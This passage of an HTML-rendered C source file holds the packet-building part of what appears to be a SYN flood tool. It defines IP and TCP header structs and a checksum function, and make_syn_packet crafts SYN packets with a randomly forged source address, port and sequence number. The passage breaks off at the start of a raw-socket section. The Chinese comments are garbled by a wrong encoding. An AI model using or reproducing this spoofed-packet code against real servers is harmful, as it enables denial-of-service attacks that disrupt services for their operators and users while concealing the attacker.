</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">171
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">172
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">173
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">174
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">175
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">176
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">177
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">178
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">179
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">180
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">181
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">182
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">183
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">184
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">185
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">186
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">187
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">188
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">189
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">190
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">191
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">192
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">193
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">194
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">195
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">196
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">197
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">198
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">199
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">200
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">201
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">202
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">203
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">204
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">205
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">206
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">207
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">208
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">209
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">210
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">211
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">212
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">213
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">214
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">215
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">216
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">217
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">218
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">219
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">220
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">221
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">222
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">223
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">224
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">225
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">226
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">227
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">228
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">229
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">230
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">231
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">232
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">233
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">234
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">235
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">236
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">237
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">238
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;ctype.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;unistd.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;fcntl.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;signal.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;sys/time.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;sys/types.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;sys/socket.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;string.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;netdb.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;errno.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;time.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;arpa/inet.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold"></span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// ip æŠ¥å¤´
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">struct</span> iphdr
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       ver_and_hdrlen;<span style="color:#007f7f">// ç‰ˆæœ¬å·ä¸IPå¤´éƒ¨é•¿åº¦
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       tos;           <span style="color:#007f7f">// æœåŠ¡ç±»å‹
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      total_len;     <span style="color:#007f7f">// æ€»é•¿åº¦
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      id;            <span style="color:#007f7f">// IPåŒ…ID
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      flags;         <span style="color:#007f7f">// æ ‡å¿—ä½(åŒ…æ‹¬åˆ†ç‰‡åç§»é‡)
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       ttl;           <span style="color:#007f7f">// ç”Ÿå‘½å‘¨æœŸ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       protocol;      <span style="color:#007f7f">// ä¸Šå±‚åè®®
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      checksum;      <span style="color:#007f7f">// æ ¡éªŒå’Œ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        srcaddr;       <span style="color:#007f7f">// æºIPåœ°å€
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        dstaddr;       <span style="color:#007f7f">// ç›®æ ‡IPåœ°å€
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// tcp æŠ¥å¤´
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">struct</span> tcphdr
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      sport;    <span style="color:#007f7f">// æºç«¯å£
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      dport;    <span style="color:#007f7f">// ç›®æ ‡ç«¯å£
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        seq;      <span style="color:#007f7f">// åºåˆ—å·
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        ack_seq;  <span style="color:#007f7f">// ç¡®è®¤å·
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       len;      <span style="color:#007f7f">// é¦–éƒ¨é•¿åº¦
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       flag;     <span style="color:#007f7f">// æ ‡å¿—ä½
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      win;      <span style="color:#007f7f">// çª—å£å¤§å°
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      checksum; <span style="color:#007f7f">// æ ¡éªŒå’Œ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      urg;      <span style="color:#007f7f">// ç´§æ€¥æŒ‡é’ˆ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">//TCPçš„ä¼ªæŠ¥å¤´ï¼Œåœ¨è®¡ç®—TCPçš„æ ¡éªŒå’Œæ—¶éœ€è¦åŒ…å«
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">struct</span> pseudohdr
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        saddr; <span style="color:#007f7f">//æºç›®çš„IP
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        daddr; <span style="color:#007f7f">// ç›®çš„IP
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">char</span>                zeros; <span style="color:#007f7f">// 8ä½ä¿ç•™å­—ç¬¦ ä¸€èˆ¬ç½®0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">char</span>                protocol;<span style="color:#007f7f">// åè®®
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      length; <span style="color:#007f7f">// é•¿åº¦
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// è¿™ä¸ªæ˜¯è®¡ç®—æ ¡éªŒå’Œçš„å‡½æ•°
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> <span style="color:#fff;font-weight:bold">inline</span>
</span></span><span style="display:flex;"><span>checksum(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> *buffer, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">long</span> cksum = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">while</span> (size &gt; <span style="color:#ff0;font-weight:bold">1</span>) {
</span></span><span style="display:flex;"><span>        cksum += *buffer++;
</span></span><span style="display:flex;"><span>        size  -= <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (size) {
</span></span><span style="display:flex;"><span>        cksum += *(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> *)buffer;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    cksum = (cksum &gt;&gt; <span style="color:#ff0;font-weight:bold">16</span>) + (cksum &amp; <span style="color:#ff0;font-weight:bold">0xffff</span>);
</span></span><span style="display:flex;"><span>    cksum += (cksum &gt;&gt; <span style="color:#ff0;font-weight:bold">16</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> (<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> )(~cksum);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// é€šè¿‡ä¼ å…¥çš„æº IP åœ°å€å’Œç›®æ ‡ IP åœ°å€åˆå§‹åŒ– IP å¤´éƒ¨ç»“æ„ã€‚
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">void</span> init_ip_header(<span style="color:#fff;font-weight:bold">struct</span> iphdr *ip, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> srcaddr,
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> dstaddr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> len = <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> iphdr) + <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> tcphdr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ip-&gt;ver_and_hdrlen = (<span style="color:#ff0;font-weight:bold">4</span>&lt;&lt;<span style="color:#ff0;font-weight:bold">4</span> | <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> iphdr)/<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>));
</span></span><span style="display:flex;"><span>    ip-&gt;tos = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;total_len = htons(len);
</span></span><span style="display:flex;"><span>    ip-&gt;id = <span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;flags = <span style="color:#ff0;font-weight:bold">0x40</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;ttl = <span style="color:#ff0;font-weight:bold">255</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;protocol = IPPROTO_TCP;
</span></span><span style="display:flex;"><span>    ip-&gt;checksum = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;srcaddr = srcaddr; <span style="color:#007f7f">// æºIPåœ°å€
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    ip-&gt;dstaddr = dstaddr; <span style="color:#007f7f">// ç›®æ ‡IPåœ°å€
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// åˆå§‹åŒ– tcp åŒ…
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">void</span> init_tcp_header(<span style="color:#fff;font-weight:bold">struct</span> tcphdr *tcp, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> dport)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    tcp-&gt;sport = htons(rand() % <span style="color:#ff0;font-weight:bold">16383</span> + <span style="color:#ff0;font-weight:bold">49152</span>);   <span style="color:#007f7f">// éšæœºç”Ÿæˆä¸€ä¸ªç«¯å£
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;dport = htons(dport);                    <span style="color:#007f7f">// ç›®æ ‡ç«¯å£
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;seq = htonl(rand() % <span style="color:#ff0;font-weight:bold">90000000</span> + <span style="color:#ff0;font-weight:bold">2345</span> );  <span style="color:#007f7f">// éšæœºç”Ÿæˆä¸€ä¸ªåˆå§‹åŒ–åºåˆ—å·
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;ack_seq = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    tcp-&gt;len = (<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> tcphdr) / <span style="color:#ff0;font-weight:bold">4</span> &lt;&lt; <span style="color:#ff0;font-weight:bold">4</span> | <span style="color:#ff0;font-weight:bold">0</span>);
</span></span><span style="display:flex;"><span>    tcp-&gt;flag = <span style="color:#ff0;font-weight:bold">0x02</span>; <span style="color:#007f7f">// 0x02 ä»£è¡¨ æ˜¯syn åŒ…ï¼Œtcpä¸‰æ¬¡è¿æ¥è¯·æ±‚çš„å¼€å§‹
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;win = htons(<span style="color:#ff0;font-weight:bold">1024</span>);
</span></span><span style="display:flex;"><span>    tcp-&gt;checksum = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    tcp-&gt;urg = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// åˆå§‹åŒ– tcp ä¼ªæŠ¥å¤´
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">void</span> init_pseudo_header(<span style="color:#fff;font-weight:bold">struct</span> pseudohdr *pseudo, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> srcaddr,
</span></span><span style="display:flex;"><span>                        <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> dstaddr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    pseudo-&gt;zeros = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    pseudo-&gt;protocol = IPPROTO_TCP;
</span></span><span style="display:flex;"><span>    pseudo-&gt;length = htons(<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> tcphdr));
</span></span><span style="display:flex;"><span>    pseudo-&gt;saddr = srcaddr;
</span></span><span style="display:flex;"><span>    pseudo-&gt;daddr = dstaddr;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// é€šè¿‡ ç›®æ ‡IPåœ°å€ å’Œ ç›®æ ‡ç«¯å£ ç”Ÿæˆä¸€ä¸ª SYNåŒ…ï¼Œä¿å­˜åˆ°å‚æ•° packet ä¸­ï¼Œå¹¶ä¸”è¿”å›åŒ…çš„å¤§å°ã€‚
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">int</span> make_syn_packet(<span style="color:#fff;font-weight:bold">char</span> *packet, <span style="color:#fff;font-weight:bold">int</span> pkt_len, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> daddr,
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> dport)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span> buf[<span style="color:#ff0;font-weight:bold">100</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> len;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">struct</span> iphdr ip;          <span style="color:#007f7f">//IP å¤´éƒ¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">struct</span> tcphdr tcp;        <span style="color:#007f7f">//TCP å¤´éƒ¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">struct</span> pseudohdr pseudo;  <span style="color:#007f7f">//TCP ä¼ªå¤´éƒ¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> saddr = rand();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    len = <span style="color:#fff;font-weight:bold">sizeof</span>(ip) + <span style="color:#fff;font-weight:bold">sizeof</span>(tcp);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// åˆå§‹åŒ–å¤´éƒ¨ä¿¡æ¯
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    init_ip_header(&amp;ip, saddr, daddr);
</span></span><span style="display:flex;"><span>    init_tcp_header(&amp;tcp, dport);
</span></span><span style="display:flex;"><span>    init_pseudo_header(&amp;pseudo, saddr, daddr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">//è®¡ç®—IPæ ¡éªŒå’Œ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    ip.checksum = checksum((u_short *)&amp;ip, <span style="color:#fff;font-weight:bold">sizeof</span>(ip));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// è®¡ç®—TCPæ ¡éªŒå’Œ
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    bzero(buf, <span style="color:#fff;font-weight:bold">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>    memcpy(buf , &amp;pseudo, <span style="color:#fff;font-weight:bold">sizeof</span>(pseudo));           <span style="color:#007f7f">// å¤åˆ¶TCPä¼ªå¤´éƒ¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    memcpy(buf + <span style="color:#fff;font-weight:bold">sizeof</span>(pseudo), &amp;tcp, <span style="color:#fff;font-weight:bold">sizeof</span>(tcp)); <span style="color:#007f7f">// å¤åˆ¶TCPå¤´éƒ¨
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp.checksum = checksum((u_short *)buf, <span style="color:#fff;font-weight:bold">sizeof</span>(pseudo) + <span style="color:#fff;font-weight:bold">sizeof</span>(tcp));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    bzero(packet, pkt_len);
</span></span><span style="display:flex;"><span>    memcpy(packet, &amp;ip, <span style="color:#fff;font-weight:bold">sizeof</span>(ip));
</span></span><span style="display:flex;"><span>    memcpy(packet + <span style="color:#fff;font-weight:bold">sizeof</span>(ip), &amp;tcp, <span style="color:#fff;font-weight:bold">sizeof</span>(tcp));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> len;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// åˆ›é€ åŸå§‹å¥—æ¥å­—
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
